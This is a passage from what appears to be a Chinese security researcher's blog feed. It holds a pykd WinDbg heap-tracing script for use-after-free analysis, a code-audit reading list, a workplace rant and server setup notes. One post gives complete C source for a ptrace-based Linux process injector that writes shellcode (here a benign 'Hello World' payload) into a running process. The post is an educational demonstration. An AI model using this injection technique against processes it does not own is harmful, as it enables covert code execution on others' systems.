self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># returns a BOOLEAN which is a byte under the hood</span></span><br><span class="line">        ret_val = hex(pykd.reg(<span class="string">"al"</span>))</span><br><span class="line">        pykd.dprintln(self.out + ret_val + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlReAllocateHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags,</span></span><br><span class="line"><span class="comment"># IN PVOID                MemoryPointer,</span></span><br><span class="line"><span class="comment"># IN ULONG                Size );</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_realloc_heap</span><span class="params">(pykd.eventHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        addr = get_address(<span class="string">"ntdll!RtlReAllocateHeap"</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(int(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.out = <span class="string">"RtlReAllocateHeap("</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">0xC</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x10</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rcx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rdx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r8"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r9"</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="keyword">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">"uf ntdll!RtlReAllocateHeap"</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(int(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        pykd.dprintln(self.out + hex(pykd.reg(return_reg)) + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pykd.reg(<span class="string">"rax"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    arch_bits = <span class="number">32</span></span><br><span class="line">    return_reg = <span class="string">"eax"</span></span><br><span class="line">    stack_pointer = <span class="string">"esp"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#addr = get_address("ntdll!RtlReAllocateHeap")</span></span><br><span class="line"><span class="comment">#print addr</span></span><br><span class="line"></span><br><span class="line">pykd.removeAllBp()</span><br><span class="line">bp_a1 = handle_allocate_heap()</span><br><span class="line">bp_a2 = handle_free_heap()</span><br><span class="line">bp_a3 = handle_realloc_heap()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'bps=%x'</span> %pykd.getNumberBreakpoints()</span><br></pre></td></tr></table></figure>
<p>我基于这些模版，写了自己做漏洞分析的时候使用的脚本。 思路也比较简单，就是找到目标对象的分配、释放点，下断点，自动记录分配/释放的内存地址、大小，然后做一个输出供自己分析用。</p>
<p>效果当然是很舒服啦  :)</p>
<h4 id="0x03-使用效果"><a href="#0x03-使用效果" class="headerlink" title="0x03 : 使用效果"></a>0x03 : 使用效果</h4><p>目标是大型软件时，windbg会有点卡，等一下就好了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; .load pykd</span><br><span class="line">&gt; !py -g path/to/script.py</span><br><span class="line">&gt; g</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x276fbff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26af2ff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x27657ff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1cff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1aff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257aaff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257bcff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x2694aff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x255cfff0</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x255cfff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x2694aff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x257bcff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x257aaff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x26f1aff0L) = 0x1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 : 简介&quot;&gt;&lt;/a&gt;0x01 : 简介&lt;/h4&gt;&lt;p&gt;分析一些情况比较复杂的UAF漏洞时，比如很多次分配、使用内存，费力寻找被UAF的对象的释放点，是比较麻烦的(对于我这种菜逼来说)，这时候可以使用pykd来辅助这个工作，能使得漏洞分析工作变得更轻松。 &lt;/p&gt;
    
    </summary>
    
    
      <category term="vuln analysis" scheme="http://o0xmuhe.me/tags/vuln-analysis/"/>
    
      <category term="uaf" scheme="http://o0xmuhe.me/tags/uaf/"/>
    
  </entry>
  
  <entry>
    <title>代码审计培养计划</title>
    <link href="http://o0xmuhe.me/2018/10/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%B9%E5%85%BB%E8%AE%A1%E5%88%92/"/>
    <id>http://o0xmuhe.me/2018/10/05/代码审计培养计划/</id>
    <published>2018-10-05T12:53:52.000Z</published>
    <updated>2018-10-22T08:15:14.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-为什么要搞这个"><a href="#0x00-为什么要搞这个" class="headerlink" title="0x00 : 为什么要搞这个"></a>0x00 : 为什么要搞这个</h4><p>因为我菜啊，而且我想学代码审计啊。</p>
<a id="more"></a>
<h4 id="0x01-第一步"><a href="#0x01-第一步" class="headerlink" title="0x01 : 第一步"></a>0x01 : 第一步</h4><p>先找点代码来读一读，学习一下，培养下代码阅读能力啥的。</p>
<h5 id="脚本引擎"><a href="#脚本引擎" class="headerlink" title="脚本引擎"></a>脚本引擎</h5><ul>
<li>tiny js </li>
</ul>
<p>just a demo0 </p>
<p><a href="https://github.com/gfwilliams/tiny-js.git" target="_blank" rel="noopener">https://github.com/gfwilliams/tiny-js.git</a></p>
<ul>
<li>jerryscript </li>
</ul>
<p>ECMS 5.1 </p>
<p><a href="https://github.com/jerryscript-project/jerryscript.git" target="_blank" rel="noopener">https://github.com/jerryscript-project/jerryscript.git</a></p>
<ul>
<li>Espruino (MPL v2.0) </li>
</ul>
<p>给嵌入式设备用的，很小 </p>
<ul>
<li>MuJS (Affero GPL) </li>
</ul>
<p>很小 demo类型 </p>
<ul>
<li>quad-wheel (MIT License) </li>
</ul>
<ul>
<li>v7 (GPL v2.0) </li>
</ul>
<p>准备先看tiny js，从最小的开始，后面看一个稍微大一点的 2 或者3 这样的。 </p>
<h5 id="文件格式类"><a href="#文件格式类" class="headerlink" title="文件格式类"></a>文件格式类</h5><p>一些小型的格式解析库、软件 </p>
<ul>
<li>Xml : tinyXML / rapidxml </li>
</ul>
<ul>
<li>PDF : mupdf / pdfium </li>
</ul>
<h4 id="0x02-已读"><a href="#0x02-已读" class="headerlink" title="0x02 : 已读"></a>0x02 : 已读</h4><ul>
<li>tiny-js</li>
</ul>
<p>就是个demo js engine，支持的东西也很基本，就是解析到token序列，然后 case TOKEN，然后走不同的执行流，执行js code。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-为什么要搞这个&quot;&gt;&lt;a href=&quot;#0x00-为什么要搞这个&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 为什么要搞这个&quot;&gt;&lt;/a&gt;0x00 : 为什么要搞这个&lt;/h4&gt;&lt;p&gt;因为我菜啊，而且我想学代码审计啊。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>飞扬历险记</title>
    <link href="http://o0xmuhe.me/2018/08/13/%E9%A3%9E%E6%89%AC%E5%8E%86%E9%99%A9%E8%AE%B0/"/>
    <id>http://o0xmuhe.me/2018/08/13/飞扬历险记/</id>
    <published>2018-08-13T08:58:43.000Z</published>
    <updated>2018-08-26T08:05:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>本故事纯属虚构，如有雷同，那就雷同吧。</p>
<a id="more"></a>
<ol>
<li><p>飞之前，工作地十分开心，能感受到自己每天在进步，反正就是工作的很开心。</p>
</li>
<li><p>自从八月六号之后，一切都变了，我开始变得负能量爆棚，骂街的频率也陡然升高。</p>
</li>
<li><p>每天9点多到，晚上不知道几点才能走，最早的一次十一点四十，最晚的一次凌晨两点多。布置那么多东西，像幼儿园小朋友一样的活动，真的是没啥意义。</p>
</li>
<li><p>半个月的时间，耽误了很多工作，再次回到工作中，有些不适应吧，花了点时间去同步、适应，太蠢了这个东西。</p>
</li>
<li><p>让我情绪比较爆发的还是后几天中，一个妹子的事，过敏+上呼吸道感染，请假居然不允许，还强行让人家去脱口秀讲话，之后还说不合格，后天再来。真的是牛逼到不行。 你们是真的都不会生病，铁人，很厉害，希望你们生病的时候也能坚持坚持再坚持。</p>
</li>
<li><p>后面还发生了用手掂起人家电脑屏幕，摔的那种方式合上并收走的事，作为一个IT🐶，这个真的不能忍，问候一下他全家。</p>
</li>
<li><p>挺搞笑的一件事，实习生刚来就半个月这么陪着一起熬，最后一天结束的时候，领导说几句“感人”的话…兄弟，现实点，加班费。</p>
</li>
</ol>
<p>最后，真的很无聊，<strong>自助难吃的一批</strong>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本故事纯属虚构，如有雷同，那就雷同吧。&lt;/p&gt;
    
    </summary>
    
    
      <category term="感悟" scheme="http://o0xmuhe.me/tags/%E6%84%9F%E6%82%9F/"/>
    
  </entry>
  
  <entry>
    <title>linux code inject</title>
    <link href="http://o0xmuhe.me/2018/06/16/linux-code-inject/"/>
    <id>http://o0xmuhe.me/2018/06/16/linux-code-inject/</id>
    <published>2018-06-16T07:21:25.000Z</published>
    <updated>2018-06-16T07:28:14.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 : 基础"></a>0x00 : 基础</h4><p>产生一个新的进程的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys_clone – creates a copy of the running process with or without shared resources (memory, file descriptors, etc.);</span><br><span class="line">sys_execve – replaces the running process with a new one (has several variations in the C library);</span><br><span class="line">fork - creates a copy of the running process but without any shared resources (Actually, both sys_fork and sys_clone come down to do_fork() function in the kernel).</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h4 id="0x01-实例"><a href="#0x01-实例" class="headerlink" title="0x01 : 实例"></a>0x01 : 实例</h4><p>目标程序代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"counter:%d\n"</span>,i);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注入程序代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> long_size = <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,<span class="keyword">char</span>* str,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * laddr;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">union</span> u&#123;</span><br><span class="line">        <span class="keyword">long</span> val;</span><br><span class="line">        <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len/long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA,child,addr+i*<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr,data.chars,long_size);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr+=long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j!=<span class="number">0</span>)&#123;</span><br><span class="line">        data.val=ptrace(PTRACE_PEEKDATA,child,addr+i*<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr,data.chars,j);</span><br><span class="line">    &#125;</span><br><span class="line">    str[len]=<span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,<span class="keyword">char</span>* str, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">union</span> u&#123;</span><br><span class="line">        <span class="keyword">long</span> val;</span><br><span class="line">        <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len/long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars,laddr,long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA,child,addr+i*<span class="number">4</span>,data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr+=long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars,laddr,j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA,child,addr+i*<span class="number">4</span>,data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>*argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> traced_process;</span><br><span class="line">    <span class="keyword">struct</span> user_regs_struct regs,newregs;</span><br><span class="line">    <span class="keyword">long</span> ins;</span><br><span class="line">    <span class="keyword">int</span> k,h;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">41</span>;</span><br><span class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">"\xeb\x15\x5e\xb8\x04\x00\x00\x00"</span></span><br><span class="line">                        <span class="string">"\xbb\x02\x00\x00\x00\x89\xf1\xba"</span></span><br><span class="line">                        <span class="string">"\x0c\x00\x00\x00\xcd\x80\xcc\xe8"</span></span><br><span class="line">                        <span class="string">"\xe6\xff\xff\xff\x48\x65\x6c\x6c"</span></span><br><span class="line">                        <span class="string">"\x6f\x20\x57\x6f\x72\x6c\x64\x0a\x00"</span>;</span><br><span class="line">    <span class="keyword">char</span> backup[len];</span><br><span class="line">    <span class="keyword">long</span> addr;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"command input error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    traced_process = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//attach to process </span></span><br><span class="line">    ptrace(PTRACE_ATTACH,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//get curren regs</span></span><br><span class="line">    ptrace(PTRACE_GETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="comment">//print eip</span></span><br><span class="line">    ins = ptrace(PTRACE_PEEKTEXT,traced_process,regs.eip,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"EIP:%lx instruction executed: %lx\n"</span>,regs.eip,ins);</span><br><span class="line">    getdata(traced_process,regs.eip,backup,len);</span><br><span class="line">    <span class="comment">//print code</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"backup is :\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">0</span>;k&lt;<span class="number">41</span>;k++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x "</span>,backup[k]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    putdata(traced_process,regs.eip,shellcode,len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"shellcode is :\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">0</span>;k&lt;<span class="number">41</span>;k++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x "</span>,shellcode[k]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="comment">//re-set args</span></span><br><span class="line">    ptrace(PTRACE_SETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="comment">//back</span></span><br><span class="line">    ptrace(PTRACE_CONT,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//wait for change</span></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Press the enter key to continue\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="comment">//recover the code</span></span><br><span class="line">    putdata(traced_process,regs.eip,backup,len);</span><br><span class="line">    ptrace(PTRACE_SETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"excute origion code\n"</span>);</span><br><span class="line">    ptrace(PTRACE_DETACH,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="0x02-效果"><a href="#0x02-效果" class="headerlink" title="0x02 : 效果"></a>0x02 : 效果</h4><p><img src="http://blogimg-10065924.cossh.myqcloud.com/linux_code_inject/1.jpg" alt="res"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-基础&quot;&gt;&lt;a href=&quot;#0x00-基础&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 基础&quot;&gt;&lt;/a&gt;0x00 : 基础&lt;/h4&gt;&lt;p&gt;产生一个新的进程的方式&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sys_clone – creates a copy of the running process with or without shared resources (memory, file descriptors, etc.);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sys_execve – replaces the running process with a new one (has several variations in the C library);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fork - creates a copy of the running process but without any shared resources (Actually, both sys_fork and sys_clone come down to do_fork() function in the kernel).&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://o0xmuhe.me/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>比赛运维杂记</title>
    <link href="http://o0xmuhe.me/2018/06/16/%E6%AF%94%E8%B5%9B%E8%BF%90%E7%BB%B4%E6%9D%82%E8%AE%B0/"/>
    <id>http://o0xmuhe.me/2018/06/16/比赛运维杂记/</id>
    <published>2018-06-16T07:12:09.000Z</published>
    <updated>2018-06-16T07:19:41.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 : 前言"></a>0x00 : 前言</h2><p>又是一届校赛了。学弟在配环境的时候一直问我相关的问题，然而我以前的笔记找不到了，今天偶然找到了，索性直接发出来吧。这是第一次参加校赛时候配环境的记录了，两年前吧，比较naive，有很多地方不全面。</p>
<a id="more"></a>
<h2 id="0x01-基本信息"><a href="#0x01-基本信息" class="headerlink" title="0x01 基本信息"></a>0x01 基本信息</h2><p>查看基本信息<code>uname -a</code> 或者 <code>cat /proc/version</code><br>查看<code>centOS</code> 系统版本 <code>rpm -q centos-release</code></p>
<h2 id="0x02-更新-centOS为例"><a href="#0x02-更新-centOS为例" class="headerlink" title="0x02 更新(centOS为例)"></a>0x02 更新(centOS为例)</h2><h3 id="1-备份"><a href="#1-备份" class="headerlink" title="1.备份"></a>1.备份</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure>
